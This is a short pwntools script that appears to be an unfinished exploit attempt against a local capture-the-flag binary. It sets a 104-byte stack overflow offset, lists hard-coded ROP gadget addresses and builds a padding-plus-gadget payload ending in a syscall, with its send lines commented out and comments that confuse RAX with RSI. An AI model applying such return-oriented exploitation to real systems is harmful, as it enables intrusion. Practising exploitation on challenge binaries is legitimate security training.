from pwn import *

io = process("./chall_14")

# 60h + 8h = 68h
offset = 104

ret_gadget = 0x0400416
pop_rdi_gadget = 0x0400696
pop_rsi_gadget = 0x0410263
pop_rdx_gadget = 0x0449b15
syscall_gadget = 0x040120c
pop_rax_gadget = 0x04158f4

io.sendline("something")

'''
15 just as an example of the value loaded into RAX register
this is passed as parameter to syscall()
'''
#payload = b"A"*offset + p64(pop_rax_gadget) + p64(15) + p64(syscall_gadget)
'''
same below uing RSI register
'''
payload = b"A"*offset + p64(pop_rsi_gadget) + p64(15) + p64(syscall_gadget)

#io.sendline(payload)
#io.interactive()